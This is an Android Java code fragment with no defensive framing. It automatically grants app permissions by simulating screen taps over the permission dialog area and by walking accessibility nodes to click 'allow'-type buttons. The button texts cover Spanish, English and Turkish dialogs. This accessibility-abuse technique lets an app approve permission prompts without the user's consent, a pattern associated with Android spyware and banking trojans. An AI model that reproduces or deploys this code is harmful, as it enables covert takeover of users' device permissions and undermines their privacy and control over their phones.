public void AllourPrivil_normal() {
    int startX = deviceWidth / 2;
    int l = this.deviceHeight;
    int startY = (int)(l * 0.845d);
    int endY = (int)(l * 0.90d);

    if (Build.VERSION.SDK_INT >= 34) {
        for (String permission : MyPermissions.ALL_PERMISSIONS) {
            try {
                Thread.sleep(100L);
            } catch (Exception e1) {
                Log.d("Permission", "" + "permission");
            }

            for (int y = startY; y <= endY; y += 10) {
                try {
                    Log.d("Permission::", permission + ":::" + String.valueOf(y) + ":::" + String.valueOf(this.deviceHeight));
                    Thread.sleep(10L);
                } catch (Exception e2) {
                    Log.d("Permission::", "permission");
                }

                if (MyPermissions.hasPermissions(getBaseContext(), permission)) {
                    break;
                }

                Common.getInstance().setLastPermissionlocation(y);
                try {
                    clickthis(startX, y);
                } catch (Exception e3) {
                }
            }
        }
    }
}


public void clickthis(int x, int y) {
    try {
        // Necesita permisos de SYSTEM_ALERT_WINDOW o ejecución como app del sistema
        Instrumentation inst = new Instrumentation();
        inst.sendPointerSync(MotionEvent.obtain(
            SystemClock.uptimeMillis(),
            SystemClock.uptimeMillis(),
            MotionEvent.ACTION_DOWN,
            x,
            y,
            0
        ));
        inst.sendPointerSync(MotionEvent.obtain(
            SystemClock.uptimeMillis(),
            SystemClock.uptimeMillis() + 100,
            MotionEvent.ACTION_UP,
            x,
            y,
            0
        ));
    } catch (Exception e) {
        Log.e("clickthis", "Error simulating touch", e);
    }
}


public void getAutomaticallyPermission(AccessibilityNodeInfo node) {
    if (node != null) {
        if (node.getClassName() != null 
            && node.getClassName().equals("android.widget.Button") 
            && node.getText() != null) {
            
            String nodeText = node.getText().toString().toLowerCase();
            
            if (nodeText.equals("durante el uso de app") 
                || nodeText.equals("permitir durante u so de app") 
                || nodeText.equals("mientras se usa la aplicación") 
                || nodeText.equals("mientras la app está en uso") 
                || nodeText.equals("permitir si la aplicación está en uso") 
                || nodeText.equals("while using the app") 
                || nodeText.equals("allow only while using the app") 
                || nodeText.equals("allow") 
                || nodeText.equals("permitir") 
                || nodeText.equals("uygulamayı kullanırken") 
                || nodeText.equals("izin ver")) {
                    
                node.performAction(16); // ACTION_CLICK
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            getAutomaticallyPermission(node.getChild(i));
        }
    }
}

